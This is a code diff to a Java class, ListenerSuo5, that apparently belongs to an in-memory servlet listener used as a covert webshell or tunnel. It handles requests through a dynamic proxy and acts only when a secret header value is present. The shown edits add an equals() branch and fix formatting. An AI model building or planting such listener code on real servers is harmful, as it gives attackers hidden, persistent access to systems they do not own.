@@ -44,6 +44,8 @@ public class ListenerSuo5 implements InvocationHandler, Runnable, HostnameVerifi
     public Object invoke(Object proxy, Method method, Object[] args) {
         if (method.getName().equals("requestInitialized")) {
             requestInitialized(args[0]);
+        } else if (method.getName().equals("equals")) {
+            return this.equals(args[0]);
         }
         return null;
     }
@@ -56,7 +58,7 @@ public class ListenerSuo5 implements InvocationHandler, Runnable, HostnameVerifi
         try {
             Object request = invokeMethod(sre.getClass(), sre, "getServletRequest", new Class[]{}, new Object[]{});
             String lv = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
-            if(lv == null || !lv.contains(lockHeaderValue)) {
+            if (lv == null || !lv.contains(lockHeaderValue)) {
                 return;
             }
             Object response = getResponse(request);
@@ -581,7 +583,7 @@ public class ListenerSuo5 implements InvocationHandler, Runnable, HostnameVerifi
     public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
         try {
             return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
-        }catch (Exception e){
+        } catch (Exception e) {
             return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
         }
     }
